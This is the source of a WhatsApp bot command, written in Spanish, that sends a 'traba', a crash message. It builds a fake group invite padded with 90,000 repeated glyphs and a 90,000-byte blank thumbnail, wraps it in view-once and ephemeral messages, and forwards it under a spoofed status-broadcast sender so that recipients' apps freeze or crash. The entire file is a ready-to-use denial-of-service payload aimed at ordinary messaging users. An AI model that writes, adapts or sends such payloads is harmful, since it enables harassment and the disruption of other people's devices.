let handler = async (m, { conn, isBot, isCreator }) => {
  if (!isCreator && !isBot) return m.reply(`❌ *COMANDO NEGADO, SOLO PUEDE USADO POR MI PORTADOR*`);

  const inviteCode = 'CHANNEL-XPL0IT-' + '𓂀'.repeat(90000);
  const groupName = '🔥 Canal Oficial ⚠️' + '꧁'.repeat(90000);
  const channelJid = '120363999999999999@g.us'; // Puedes cambiar esto por otro canal real si quieres
  const thumbnailFake = Buffer.alloc(90000);

  const fakeInviteContent = {
    groupJid: channelJid,
    inviteCode,
    groupName,
    jpegThumbnail: thumbnailFake
  };

  const wrappedViewOnce = {
    viewOnceMessage: {
      message: {
        groupInviteMessage: fakeInviteContent
      }
    }
  };

  const wrappedEphemeral = {
    ephemeralMessage: {
      message: {
        groupInviteMessage: fakeInviteContent
      }
    }
  };

  // Enviar dos tipos de trabas (viewOnce y ephemeral)
  await conn.relayMessage(
    m.chat,
    {
      forward: {
        key: {
          fromMe: false,
          participant: '0@s.whatsapp.net',
          remoteJid: 'status@broadcast'
        },
        message: wrappedViewOnce
      }
    },
    { messageId: generateMessageID() }
  );

  await conn.relayMessage(
    m.chat,
    {
      forward: {
        key: {
          fromMe: false,
          participant: '0@s.whatsapp.net',
          remoteJid: 'status@broadcast'
        },
        message: wrappedEphemeral
      }
    },
    { messageId: generateMessageID() }
  );

  m.reply('✅ *Traba tipo canal enviada correctamente.*');
};

handler.command = ["lagcanalplus", "canalcrash", "traba2"];
export default handler;